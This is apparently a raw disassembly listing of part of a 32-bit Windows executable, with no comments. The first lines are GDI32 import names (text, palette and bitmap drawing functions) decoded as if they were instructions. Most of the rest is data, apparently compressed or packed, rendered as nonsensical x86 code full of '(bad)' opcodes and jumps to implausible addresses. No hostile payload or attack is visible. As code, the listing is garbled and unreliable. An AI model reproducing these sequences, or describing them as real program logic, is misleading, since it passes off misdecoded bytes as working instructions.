  4291c3:	mov    esi,0x646e4500
  4291c8:	inc    esp
  4291c9:	outs   dx,DWORD PTR ds:[esi]
  4291ca:	arpl   WORD PTR [eax],ax
  4291cc:	add    BYTE PTR [edx+0x65724300],ah
  4291d2:	popa   
  4291d3:	je     0x42923a
  4291d5:	dec    ecx
  4291d6:	inc    ebx
  4291d7:	push   edi
  4291d8:	add    BYTE PTR [ebp+0x0],dh
  4291db:	inc    edx
  4291dc:	imul   ebp,DWORD PTR gs:[bp+0x50],0x687461
  4291e5:	xchg   ecx,eax
  4291e6:	add    DWORD PTR [edi+0x65],eax
  4291e9:	je     0x429242
  4291eb:	imul   ebp,DWORD PTR [esi+0x64],0x724f776f
  4291f2:	addr16 inc ebp
  4291f4:	js     0x4291f6
  4291f6:	add    BYTE PTR [esi+0x65724300],ah
  4291fc:	popa   
  4291fd:	je     0x429264
  4291ff:	push   eax
  429200:	popa   
  429201:	je     0x429277
  429203:	gs jb  0x429274
  429206:	inc    edx
  429207:	jb     0x42927e
  429209:	jae    0x429273
  42920b:	add    BYTE PTR [eax],al
  42920d:	xchg   esp,eax
  42920e:	add    BYTE PTR [ebx+0x72],al
  429211:	gs popa 
  429213:	je     0x42927a
  429215:	inc    esp
  429216:	imul   esi,DWORD PTR [ebx+0x63],0x61647261
  42921d:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  429221:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xab0070
  429229:	inc    ebx
  42922a:	jb     0x429291
  42922c:	popa   
  42922d:	je     0x429294
  42922f:	push   edx
  429230:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  429235:	outs   dx,BYTE PTR ds:[esi]
  429236:	add    BYTE PTR [eax+eax*1+0x696c6c45],bh
  42923d:	jo     0x4292b2
  42923f:	add    BYTE PTR gs:[ebp+0x65724300],ah
  429246:	popa   
  429247:	je     0x4292ae
  429249:	push   eax
  42924a:	popa   
  42924b:	ins    BYTE PTR es:[edi],dx
  42924c:	gs je  0x4292c3
  42924f:	add    BYTE PTR gs:[edi],cl
  429252:	add    dl,BYTE PTR [ebp+0x6e]
  429255:	jb     0x4292bc
  429257:	popa   
  429258:	ins    BYTE PTR es:[edi],dx
  429259:	imul   edi,DWORD PTR [edx+0x65],0x656a624f
  429260:	arpl   WORD PTR [eax+eax*1-0x2c],si
  429264:	add    BYTE PTR [ebp+0x78],al
  429267:	je     0x4292bd
  429269:	gs js  0x4292e0
  42926c:	dec    edi
  42926d:	jne    0x4292e3
  42926f:	inc    ecx
  429270:	add    BYTE PTR [ecx+0x1],bh
  429273:	inc    edi
  429274:	gs je  0x4292ca
  429277:	jns    0x4292ec
  429279:	je     0x4292e0
  42927b:	ins    DWORD PTR es:[edi],dx
  42927c:	push   eax
  42927d:	popa   
  42927e:	ins    BYTE PTR es:[edi],dx
  42927f:	gs je  0x4292f6
  429282:	gs inc ebp
  429284:	outs   dx,BYTE PTR ds:[esi]
  429285:	je     0x4292f9
  429287:	imul   esp,DWORD PTR [ebp+0x73],0x5201c600
  42928e:	outs   dx,DWORD PTR ds:[esi]
  42928f:	jne    0x4292ff
  429291:	fs push edx
  429293:	arpl   WORD PTR gs:[eax+eax*1+0x47],si
  429298:	inc    esp
  429299:	dec    ecx
  42929a:	xor    esi,DWORD PTR [edx]
  42929c:	cs fs ins BYTE PTR es:[edi],dx
  42929f:	ins    BYTE PTR es:[edi],dx
  4292a0:	add    BYTE PTR [eax+0x6b],ah
  4292a3:	adc    BYTE PTR [eax],al
  4292a5:	mov    dl,0x30
  4292a7:	adc    BYTE PTR [eax],al
  4292a9:	jp     0x429324
  4292ab:	adc    BYTE PTR [eax],al
  4292ad:	adc    al,0x2b
  4292af:	adc    BYTE PTR [eax],al
  4292b1:	in     eax,0x2f
  4292b3:	adc    BYTE PTR [eax],al
  4292b5:	inc    edi
  4292b6:	pop    esp
  4292b7:	adc    BYTE PTR [eax],al
  4292b9:	xchg   edx,eax
  4292ba:	dec    edi
  4292bb:	adc    BYTE PTR [eax],al
  4292bd:	xchg   ecx,eax
  4292be:	push   ecx
  4292bf:	adc    BYTE PTR [eax],al
  4292c1:	or     dl,BYTE PTR [bx+si]
  4292c4:	add    BYTE PTR [ebx+0x70],ah
  4292c7:	adc    BYTE PTR [eax],al
  4292c9:	xchg   esi,eax
  4292ca:	adc    BYTE PTR fs:[eax],al
  4292cd:	mov    dh,0x69
  4292cf:	adc    BYTE PTR [eax],al
  4292d1:	cdq    
  4292d2:	js     0x4292e4
  4292d4:	add    dl,bl
  4292d6:	data16 adc BYTE PTR [eax],al
  4292d9:	inc    edi
  4292da:	sub    dl,BYTE PTR [eax]
  4292dc:	add    BYTE PTR [eax+ebx*2-0x6d5efff0],ah
  4292e3:	inc    edx
  4292e4:	add    BYTE PTR [ebp-0x56ffbd6e],ah
  4292ea:	xchg   edx,eax
  4292eb:	inc    edx
  4292ec:	add    BYTE PTR [ebp-0x4effbd6e],ch
  4292f2:	xchg   edx,eax
  4292f3:	inc    edx
  4292f4:	add    BYTE PTR [ebp-0x46ffbd6e],dh
  4292fa:	xchg   edx,eax
  4292fb:	inc    edx
  4292fc:	add    BYTE PTR [ebp+0x4d004292],bh
  429302:	push   ebp
  429303:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  429309:	mov    esp,ebp
  42930b:	or     ah,dh
  42930d:	dec    ebp
  42930e:	add    bh,al
  429310:	add    BYTE PTR [eax],cl
  429312:	add    BYTE PTR [eax],al
  429314:	mov    DWORD PTR [eax],0x40f44545
  42931a:	xor    eax,0x9c8b8500
  42931f:	hlt    
  429320:	clc    
  429321:	retf   
  429322:	(bad)  
  429323:	enter  0x4d45,0xbc
  429327:	mov    esi,DWORD PTR [esp+esi*8]
  42932a:	test   ebx,ecx
  42932c:	pushf  
  42932d:	enter  0x4df8,0x8b
  429331:	mov    DWORD PTR [ebp-0x20],0x890208
  429338:	inc    ebp
  429339:	inc    ebp
  42933a:	cld    
  42933b:	xor    cl,BYTE PTR [ebx-0xb38b300]
  429341:	or     BYTE PTR [ebx+0x0],dl
  429344:	mov    ebx,0x8bd5700
  429349:	call   DWORD PTR [ecx-0x1]
  42934c:	pop    es
  42934d:	mov    ch,0x33
  42934f:	dec    ebx
  429351:	(bad)  
  429352:	mov    eax,0x72009ea4
  429357:	push   DWORD PTR [edx]
  429359:	or     BYTE PTR [eax],al
  42935b:	jmp    0xff89:0x75c84d03
  429362:	dec    ebp
  429363:	loopne 0x429335
  429365:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  42936b:	add    BYTE PTR [ebx],dh
  42936d:	mov    ecx,ebx
  42936f:	hlt    
  429370:	add    ecx,ebx
  429372:	enter  0x899e,0x32
  429376:	dec    ebp
  429377:	add    ecx,eax
  429379:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  42937f:	or     DWORD PTR [ebx-0xb00b29c],0x0
  429386:	xor    ecx,ebx
  429388:	retf   
  429389:	enter  0x4d03,0xc8
  42938d:	mov    DWORD PTR fs:[eax],ebx
  429390:	lea    eax,[eax]
  429392:	push   esp
  429393:	mov    edi,edi
  429395:	fs (bad) 
  429397:	(bad)  
  429398:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  42939e:	push   0xffffffff
  4293a0:	and    bh,bh
  4293a2:	pop    ecx
  4293a3:	inc    eax
  4293a4:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  4293aa:	push   0xffffff8b
  4293ac:	pop    ecx
  4293ad:	cld    
  4293ae:	dec    ebp
  4293af:	lea    ecx,[ecx+0x45ff08ff]
  4293b5:	mov    BYTE PTR [edx+0x1],cl
  4293b8:	add    BYTE PTR [eax],al
  4293ba:	mov    DWORD PTR [ebp+0x8],0x58008d
  4293c1:	dec    DWORD PTR [ebp-0x77]
  4293c4:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  4293cb:	cld    
  4293cc:	dec    ebp
  4293cd:	jne    0x429402
  4293cf:	lea    eax,[ebx]
  4293d1:	push   eax
  4293d2:	mov    edi,edi
  4293d4:	or     BYTE PTR [ecx+0x54a845],cl
  4293da:	add    al,ch
  4293dc:	(bad)  
  4293dd:	sub    esp,ebp
  4293df:	add    BYTE PTR [eax],al
  4293e1:	rol    BYTE PTR [eax],0x84
  4293e4:	inc    ebp
  4293e5:	add    dh,BYTE PTR [esi+0x0]
  4293e8:	add    BYTE PTR [ebp-0x73],al
  4293eb:	mov    ebp,DWORD PTR [esp+edx*4]
  4293ee:	inc    DWORD PTR [eax]
  4293f0:	lea    ecx,[ebx-0x30074f4]
  4293f6:	call   0x439f7b
  4293fb:	add    BYTE PTR [ebp+0x0],cl
  4293fe:	jne    0x429441
  429400:	dec    DWORD PTR [ebx-0x76210314]
  429406:	dec    ebp
  429407:	add    DWORD PTR [ebp+0x0],esi
  42940a:	(bad)  
  42940b:	xchg   ebp,eax
  42940c:	loopne 0x42940d
  42940e:	inc    eax
  42940f:	inc    DWORD PTR [eax]
  429411:	mov    ecx,DWORD PTR [ebp-0x4]
  429414:	xor    edx,DWORD PTR [edx+0x7201b8]
  42941a:	add    BYTE PTR [edx],dl
  42941c:	enter  0x4d90,0x0
  429420:	mov    eax,DWORD PTR [eax]
  429422:	hlt    
  429423:	add    al,0xa5
  429425:	mov    al,0xff
  429427:	add    bh,bh
  429429:	add    BYTE PTR [ebx],dh
  42942b:	inc    DWORD PTR [ebx]
  42942d:	sbb    al,0x89
  42942f:	jne    0x429409
  429431:	mov    esp,DWORD PTR [ecx+0x4500fc]
  429437:	mov    eax,DWORD PTR [ebp-0xff0048]
  42943d:	mov    DWORD PTR [eax-0x70],0xee58e189
  429444:	inc    DWORD PTR [ebp-0x75]
  429447:	ror    DWORD PTR [esp+ebp*8],1
  42944a:	test   DWORD PTR [esi-0x1],esp
  42944d:	inc    ebp
  42944e:	(bad)  
  42944f:	aas    
  429450:	inc    ebp
  429451:	(bad)  
  429452:	lea    edi,[esp+eiz*2-0x1]
  429456:	push   DWORD PTR [edi]
  429458:	mov    DWORD PTR [ecx],esi
  42945a:	mov    al,ds:0x8b8000c7
  42945f:	out    dx,al
  429460:	cld    
  429461:	call   0xed41d9f3
  429466:	(bad)  
  429467:	fisttp WORD PTR [eax+0x8801c7]
  42946d:	jmp    0x4294b4
  42946f:	out    dx,al
  429470:	inc    DWORD PTR [ebp-0x4]
  429473:	xlat   BYTE PTR ds:[ebx]
  429474:	lea    edi,[edi]
  429476:	inc    edi
  429478:	jmp    FWORD PTR [eax-0x78]
  42947b:	inc    DWORD PTR [ecx]
  42947d:	aaa    
  42947e:	add    BYTE PTR [ecx],dh
  429480:	repnz mov DWORD PTR [eax],0xfff856c
  429487:	ffreep st(5)
  429489:	aas    
  42948a:	add    bh,al
  42948c:	mov    esi,DWORD PTR [eax-0x4]
  42948f:	inc    DWORD PTR [eax+0xdf01ec]
  429495:	(bad)  
  429496:	or     BYTE PTR [ebp+eax*2-0x1],dh
  42949a:	mov    esp,ebx
  42949c:	xchg   esp,eax
  42949d:	rol    DWORD PTR [eax],cl
  42949f:	(bad)  
  4294a0:	mov    edi,DWORD PTR [eax+0x3]
  4294a3:	(bad)  
  4294a4:	cmp    al,0xd7
  4294a6:	dec    ebp
  4294a7:	lds    ecx,FWORD PTR [ebx+0x29d8e8]
  4294ad:	add    BYTE PTR [ebp-0x3b375],cl
  4294b3:	adc    BYTE PTR [edx+0x1],0x55
  4294b7:	add    BYTE PTR [ebx+0x58c30],cl
  4294bd:	add    BYTE PTR [ebx-0x778afc7b],cl
  4294c3:	mov    eax,DWORD PTR [eax]
  4294c5:	cld    
  4294c6:	push   0x7d
  4294c8:	dec    DWORD PTR [ebx+0xd88c]
  4294ce:	push   edx
  4294cf:	mov    edx,DWORD PTR [ecx-0x4]
  4294d2:	call   DWORD PTR [eax+0x7d01fc]
  4294d8:	mov    esp,DWORD PTR [esp+edi*8]
  4294db:	add    BYTE PTR [eax+0x560150],dl
  4294e1:	test   DWORD PTR [ebp+0x75],eax
  4294e4:	call   0xc83f7574
  4294e9:	jge    0x42947f
  4294eb:	mov    ebp,ebx
  4294ed:	fcom   st(7)
  4294ef:	add    bh,al
  4294f1:	mov    ebx,DWORD PTR [eax-0x7a6f8304]
  4294f7:	add    edi,edi
  4294f9:	add    bh,bh
  4294fb:	add    ah,cl
  4294fd:	add    ah,dl
  4294ff:	push   eax
  429500:	inc    ebp
  429501:	push   esi
  429502:	fisttp WORD PTR [ebx+0x4dc7f43f]
  429508:	test   BYTE PTR [ebx],dh
  42950a:	aam    0x5
  42950c:	retf   0x4572
  42950f:	add    bl,ah
  429511:	rcl    ebx,0x84
  429514:	mov    DWORD PTR [ecx],0x46d1008c
  42951a:	jl     0x42951c
  42951c:	test   edi,eax
  42951e:	jmp    esp
  429520:	inc    DWORD PTR [eax]
  429522:	loope  0x429524
  429524:	aam    0x75
  429526:	test   DWORD PTR [ebx+0x45fffcff],ecx
  42952c:	out    dx,al
  42952d:	mov    ebp,eax
  42952f:	mov    ah,0x85
  429531:	add    bh,bh
  429533:	call   0x116be37
  429538:	retf   0x858b
  42953b:	cld    
  42953c:	inc    DWORD PTR [eax+0xeb01ff]
  429542:	out    dx,al
  429543:	xor    BYTE PTR [ebp-0xff0085],al
  429549:	mov    edx,ecx
  42954b:	cld    
  42954c:	jl     0x4294d7
  42954e:	push   ebx
  42954f:	add    DWORD PTR [eax],eax
  429551:	add    BYTE PTR [eax+0x1],dl
  429554:	inc    ebp
  429555:	inc    ebp
  429556:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  42955c:	dec    DWORD PTR [ebx-0x3fd90318]
  429562:	add    BYTE PTR [ebp-0xbf0040],dl
  429568:	inc    ebp
  429569:	retf   0x8b
  42956c:	cld    
  42956d:	push   eax
  42956e:	mov    al,0x45
  429570:	add    DWORD PTR [ebx+0x459c00],ecx
  429576:	mov    edi,edi
  429578:	mov    eax,0xe80800ff
  42957d:	inc    ebp
  42957e:	sub    DWORD PTR [ebx-0x47000400],ecx
  429584:	add    al,0x1
  429586:	rol    BYTE PTR [eax],0x1e
  429589:	jne    0x4295d0
  42958b:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  429591:	inc    DWORD PTR [ecx]
  429593:	call   0x87bd98
  429598:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  42959e:	call   0x42bea4
  4295a3:	xor    bh,bh
  4295a5:	push   edi
  4295a6:	adc    BYTE PTR [ebx-0x747423bb],al
  4295ac:	loopne 0x42958a
  4295ae:	ret    
  4295af:	loopne 0x42954f
  4295b1:	xor    DWORD PTR [edx],0x31
  4295b4:	cmp    edi,edi
  4295b6:	bswap  esp
  4295b8:	rol    BYTE PTR gs:[eax],0x5
  4295bc:	jmp    0x12d9706
  4295c1:	mov    eax,DWORD PTR [ebp-0x4]
  4295c4:	add    BYTE PTR [eax+0xff0100],bh
  4295ca:	cld    
  4295cb:	jne    0x42964a
  4295cd:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  4295d3:	pusha  
  4295d4:	add    DWORD PTR [eax],eax
  4295d6:	add    BYTE PTR [eax-0x37],dl
  4295d9:	inc    ebp
  4295da:	add    BYTE PTR [ebx+0x459850],cl
  4295e0:	mov    edi,edi
  4295e2:	test   al,0xff
  4295e4:	add    BYTE PTR [eax],cl
  4295e6:	inc    DWORD PTR [ebp-0x18]
  4295e9:	jmp    DWORD PTR ds:0x4d7d00dc
  4295ef:	adc    BYTE PTR [ebx+0x459cb9],cl
  4295f5:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  4295fb:	sahf   
  4295fc:	mov    eax,0x30132
  429601:	lea    esi,[ebp+0x2c]
  429604:	xor    edi,edi
  429606:	(bad)  
  429607:	call   0x141be74
  42960c:	call   0x136be9c
  429611:	jne    0x42959e
  429613:	xor    edi,esp
  429615:	add    eax,DWORD PTR [eax+0xc018d]
  42961b:	push   DWORD PTR [eax]
  42961d:	call   0xcbbe79
  429622:	int3   
  429623:	inc    DWORD PTR [ebp-0x14]
  429626:	mov    ecx,DWORD PTR [ebp-0x28]
  429629:	xor    eax,DWORD PTR [eax]
  42962b:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  429631:	(bad)  
  429632:	xchg   ebp,eax
  429633:	in     al,0xff
  429635:	add    bh,bh
  429637:	add    BYTE PTR [edi+0x508b0045],bl
  42963d:	or     BYTE PTR [ebp-0x3d],al
  429640:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff62]
  429647:	mov    edi,edi
  429649:	or     BYTE PTR [eax],cl
  42964b:	inc    ebp
  42964c:	test   DWORD PTR gs:[eax],eax
  42964f:	je     0x429696
  429651:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  429657:	xor    edx,DWORD PTR [eax-0x73]
  42965a:	push   ebp
  42965b:	or     BYTE PTR [ebp+0x21007572],al
  429661:	inc    ebp
  429662:	in     al,dx
  429663:	mov    ebp,DWORD PTR [eax]
  429665:	mov    esp,0x628bc345
  42966a:	fmul   st,st(5)
  42966c:	add    BYTE PTR [ebx],ch
  42966e:	mov    eax,DWORD PTR [ebx]
  429670:	cld    
  429671:	loopne 0x429633
  429673:	inc    ebp
  429674:	push   ebp
  429675:	cmp    ebp,eax
  429677:	movaps xmm4,XMMWORD PTR [eax-0x74740100]
  42967e:	cld    
  42967f:	fadd   DWORD PTR [eax+0x3b014d]
  429685:	jne    0x4296b7
  429687:	push   0xf8898557
  42968c:	in     al,dx
  42968d:	jne    0x4296d4
  42968f:	lea    eax,[ebx+0x72e8dcc8]
  429695:	xor    BYTE PTR [ebx+0x7545bc00],cl
  42969b:	jmp    0x4296d0
  42969d:	mov    edi,DWORD PTR [edi+0x4572bc]
  4296a3:	xor    eax,edi
  4296a5:	adc    DWORD PTR [ebp-0xcd0062],0x8b2b31
  4296af:	rcl    BYTE PTR [eax-0x40],1
  4296b2:	inc    ebp
  4296b3:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  4296bb:	inc    ebp
  4296bc:	xchg   ebp,eax
  4296bd:	ud0    ebp,DWORD PTR [ebx]
  4296c0:	inc    DWORD PTR [eax]
  4296c2:	adc    eax,0x508a0076
  4296c7:	adc    BYTE PTR [ebp+0x1f],0x8b
  4296cb:	or     al,0xf4
  4296cd:	inc    eax
  4296ce:	retf   
  4296cf:	inc    ebp
  4296d0:	iret   
  4296d1:	jb     0x42969b
  4296d3:	mov    eax,DWORD PTR [edi]
  4296d5:	enter  0x4545,0x1
  4296d9:	xor    eax,0x898b9c00
  4296de:	mov    esp,0x33344df0
  4296e3:	pushf  
  4296e4:	lea    ecx,[ecx+0x4d72e008]
  4296ea:	add    BYTE PTR [ebx],dh
  4296ec:	inc    ebp
  4296ed:	mov    DWORD PTR [ebx-0x3f611b4c],ecx
  4296f3:	xor    dl,BYTE PTR [edx]
  4296f5:	add    eax,DWORD PTR [ebp-0x77]
  4296f8:	mov    eax,esp
  4296fa:	fmul   DWORD PTR [ebp-0x3d]
  4296fd:	xor    eax,DWORD PTR [ebx+eax*1+0x832899e]
  429704:	mov    DWORD PTR [ebp-0x28],eax
  429707:	aad    0x45
  429709:	pushf  
  42970a:	xor    eax,edi
  42970c:	mov    ecx,0xff858db0
  429711:	clc    
  429712:	enter  0x4d45,0x32
  429716:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  42971d:	test   esi,edi
  42971f:	clc    
  429720:	inc    DWORD PTR [ebp+0x45]
  429723:	xor    BYTE PTR [ebx-0x3738f764],cl
  429729:	test   al,0x16
  42972b:	test   DWORD PTR ds:0xff459cf8,esi
  429731:	ds cld 
  429733:	pushf  
  429734:	inc    ebp
  429735:	mov    edx,DWORD PTR [eax-0x28]
  429738:	popf   
  429739:	push   ebp
  42973a:	add    BYTE PTR [ebx],dh
  42973c:	mov    DWORD PTR [ebx],eax
  42973e:	sar    BYTE PTR [ebx],1
  429740:	adc    BYTE PTR [edi],cl
  429742:	dec    ebp
  429743:	adc    al,0x8b
  429745:	add    al,dl
  429747:	jmp    0x1039917
  42974c:	jb     0x42979b
  42974e:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  429754:	xor    ecx,DWORD PTR [ebp+0x3b]
  429757:	xor    ecx,DWORD PTR [edi]
  429759:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  42975d:	(bad)  
  42975f:	clc    
  429760:	enter  0x8400,0x8b
  429764:	pop    es
  429765:	mov    al,0x0
  429767:	push   ebp
  429768:	push   cs
  429769:	xor    ecx,eax
  42976b:	xor    esp,ecx
  42976d:	add    ebp,DWORD PTR [eax]
  42976f:	add    esi,DWORD PTR [eax]
  429771:	(bad)  
  429773:	retf   0x55c8
  429776:	repnz mov eax,DWORD PTR [ebp-0x10]
  42977a:	(bad)  
  42977b:	cli    
  42977c:	fdivr  st,st(1)
  42977e:	test   DWORD PTR [eax+edi*8],ecx
  429781:	dec    ebp
  429782:	inc    ebp
  429783:	xor    edi,DWORD PTR [eax-0x7167afd]
  429789:	add    BYTE PTR [ebp+0x0],al
  42978c:	mov    ecx,DWORD PTR [ebp-0x28]
  42978f:	mov    ecx,ebx
  429791:	clc    
  429792:	jne    0x42975f
  429794:	mov    esi,0xd672d3
  429799:	into   
  42979a:	into   
  42979b:	scas   eax,DWORD PTR es:[edi]
  42979c:	dec    ebp
  42979d:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  4297a3:	sub    ecx,esi
  4297a5:	cmp    ecx,DWORD PTR [ebp+0x77]
  4297a8:	(bad)  
  4297a9:	mov    edi,eax
  4297ab:	mov    al,0x85
  4297ad:	mov    eax,edi
  4297af:	add    BYTE PTR [ebp-0x75],al
  4297b2:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  4297b9:	xor    eax,DWORD PTR [ebp+0x4503f803]
  4297bf:	rdtsc  
  4297c1:	retf   0x559c
  4297c4:	(bad)  
  4297c5:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  4297cc:	inc    ebp
  4297cd:	add    eax,0xeb9c4d3f
  4297d2:	(bad)  
  4297d3:	mov    ecx,esp
  4297d5:	lods   al,BYTE PTR ds:[esi]
  4297d6:	test   DWORD PTR [ebp-0x8],edx
  4297d9:	xor    ecx,DWORD PTR [ebp+0x33]
  4297dc:	mov    eax,DWORD PTR [ebx]
  4297de:	lock add ecx,ebx
  4297e1:	bswap  esi
  4297e3:	retf   0x55d1
  4297e6:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  4297ec:	jmp    0x4297e7
  4297ee:	add    BYTE PTR ds:0xebc44d8b,al
  4297f4:	push   ebp
  4297f5:	mov    ebp,DWORD PTR [ebx]
  4297f7:	test   al,0x8b
  4297f9:	push   ebp
  4297fa:	clc    
  4297fb:	xor    ecx,ebx
  4297fd:	xor    ecx,esi
  4297ff:	add    edx,ecx
  429801:	add    eax,DWORD PTR [edx+0xca010f]
  429807:	push   ebp
  429808:	dec    ebp
  429809:	mov    ecx,DWORD PTR [ebx-0x34050710]
  42980f:	stc    
  429810:	rol    DWORD PTR ds:0xebce4dd6,cl
  429816:	scas   eax,DWORD PTR es:[edi]
  429817:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  42981d:	xor    ebp,DWORD PTR [ebx]
  42981f:	xor    edi,DWORD PTR [ebx]
  429821:	add    esi,DWORD PTR [edi+0x3]
  429824:	mov    ecx,DWORD PTR [edi]
  429826:	clc    
  429827:	retf   0x55cb
  42982a:	into   
  42982b:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  429832:	mov    eax,0x3376554d
  429837:	mov    esi,DWORD PTR [ebx]
  429839:	int3   
  42983a:	add    edx,DWORD PTR [ebp+0x3]
  42983d:	xor    ecx,DWORD PTR [edi]
  42983f:	xor    ecx,edx
  429841:	add    edx,DWORD PTR [ebp+0x3]
  429844:	mov    ecx,DWORD PTR [edi]
  429846:	lock retf 0x4dfa
  42984a:	stc    
  42984b:	mov    ecx,DWORD PTR [eax]
  42984d:	or     BYTE PTR [ebp+0x4d],cl
  429850:	jmp    0x10698e0
  429855:	dec    ebp
  429856:	dec    ebp
  429857:	(bad)  
  429858:	mov    ebx,esp
  42985a:	clc    
  42985b:	test   ebx,ecx
  42985d:	clc    
  42985e:	ror    DWORD PTR [ebp-0x2a],cl
  429861:	mov    esi,ecx
  429863:	call   0x33cdde17
  429868:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  42986f:	retf   
  429870:	ja     0x429840
  429872:	mov    ebp,DWORD PTR [eax-0x48]
  429875:	dec    ebp
  429876:	xor    ecx,DWORD PTR [di+0x3]
  42987a:	mov    esp,esp
  42987c:	clc    
  42987d:	push   ebp
  42987e:	retf   
  42987f:	mov    dl,bl
  429881:	adc    esi,edx
  429883:	jb     0x429853
  429885:	add    BYTE PTR [edi-0x3b7474b3],ch
  42988b:	call   0x4d6e640d
  429890:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  429896:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429897:	sahf   
  429898:	inc    ebp
  429899:	xor    cl,BYTE PTR [ebp-0x78]
  42989c:	mov    edx,edi
  42989e:	clc    
  42989f:	dec    ebp
  4298a0:	retf   
  4298a1:	mov    edx,ebx
  4298a3:	call   0x56116c7e
  4298a8:	scas   eax,DWORD PTR es:[edi]
  4298a9:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  4298af:	sahf   
  4298b0:	sub    esi,DWORD PTR [edx]
  4298b2:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  4298b8:	lods   al,BYTE PTR ds:[esi]
  4298b9:	xor    esp,DWORD PTR [ebx]
  4298bb:	add    ecx,DWORD PTR [ebp-0x1c]
  4298be:	mov    edi,DWORD PTR [ebp-0x8]
  4298c1:	mov    bl,cl
  4298c3:	cmp    dl,bl
  4298c5:	jb     0x429895
  4298c7:	add    dh,dl
  4298c9:	dec    ebp
  4298ca:	scas   eax,DWORD PTR es:[edi]
  4298cb:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  4298d1:	shr    DWORD PTR [ebx],cl
  4298d3:	into   
  4298d4:	cmp    edx,esi
  4298d6:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  4298dc:	dec    ebp
  4298dd:	dec    ebp
  4298de:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  4298e4:	retf   
  4298e5:	xor    edx,esi
  4298e7:	add    ecx,esi
  4298e9:	imul   ecx,edx
  4298ec:	mov    DWORD PTR [ebp+0x8],edx
  4298ef:	xor    ecx,DWORD PTR [ebp+0x2b]
  4298f2:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  4298f8:	add    esi,DWORD PTR [ebx]
  4298fa:	mov    ah,0x3
  4298fc:	inc    ebp
  4298fd:	sysexit 
  4298ff:	xlat   BYTE PTR ds:[ebx]
  429900:	pushf  
  429901:	jge    0x42988c
  429903:	xor    ebx,eax
  429905:	sub    eax,DWORD PTR [ebp-0x73]
  429908:	(bad)  
  429909:	cmp    al,al
  42990b:	jb     0x429892
  42990d:	add    al,bh
  42990f:	ror    DWORD PTR [ebp-0x7a],1
  429912:	xor    edi,edi
  429914:	add    edi,edi
  429916:	jmp    0x429965
  429918:	mov    ecx,DWORD PTR [ebx-0x34341324]
  42991e:	dec    ebp
  42991f:	into   
  429920:	mov    ebp,DWORD PTR [edi-0x23737428]
  429926:	sahf   
  429927:	shl    DWORD PTR [edx],cl
  429929:	retf   0x5588
  42992c:	or     ecx,DWORD PTR [ebp+0x7233114d]
  429932:	add    eax,DWORD PTR [eax]
  429934:	in     al,0x4d
  429936:	push   ebp
  429937:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  42993d:	bound  eax,QWORD PTR [eax]
  42993f:	int    0x4d
  429941:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  429947:	dec    ebp
  429948:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  42994e:	jge    0x42991e
  429950:	mov    BYTE PTR [edi+0xf723b3a],ch
  429956:	add    cl,dh
  429958:	dec    ebp
  429959:	dec    DWORD PTR [ebx-0x2c032375]
  42995f:	adc    BYTE PTR [ebp+0x1],0x8b
  429963:	add    al,bl
  429965:	jge    0x4298f3
  429967:	push   0xffffff9e
  429969:	push   0x8b3032
  42996e:	shl    BYTE PTR [ebp+0x55],0x6a
  429972:	xor    edi,edi
  429974:	xor    edx,DWORD PTR [ebx+eax*1]
  429977:	inc    ebp
  429978:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  42997e:	dec    ebp
  42997f:	or     BYTE PTR [ecx+0x4dc8e483],cl
  429985:	jbe    0x429912
  429987:	mov    ebp,esp
  429989:	ror    bl,1
  42998b:	enter  0x14ce,0xaf
  42998f:	dec    DWORD PTR [ebx-0x2cef17f8]
  429995:	push   ebp
  429996:	retf   0x5540
  429999:	push   ebp
  42999a:	mov    esi,DWORD PTR [edx-0x1c]
  42999d:	mov    edx,ebx
  42999f:	cld    
  4299a0:	(bad)  
  4299a1:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  4299a8:	sti    
  4299a9:	add    dh,cl
  4299ab:	push   0xffffff94
  4299ad:	call   FWORD PTR [esi+0x3b5032d0]
  4299b3:	mov    ecx,DWORD PTR [edi]
  4299b5:	int3   
  4299b6:	pop    esi
  4299b7:	inc    ebp
  4299b8:	dec    DWORD PTR [ecx+0x45e8c88b]
  4299be:	push   ebp
  4299bf:	xor    esi,DWORD PTR [ebx]
  4299c1:	mov    DWORD PTR [ebx],0xcacc0f9c
  4299c7:	aas    
  4299c8:	push   ebp
  4299c9:	inc    ebp
  4299ca:	xor    eax,esp
  4299cc:	add    eax,esp
  4299ce:	mov    eax,DWORD PTR [ebx]
  4299d0:	(bad)  
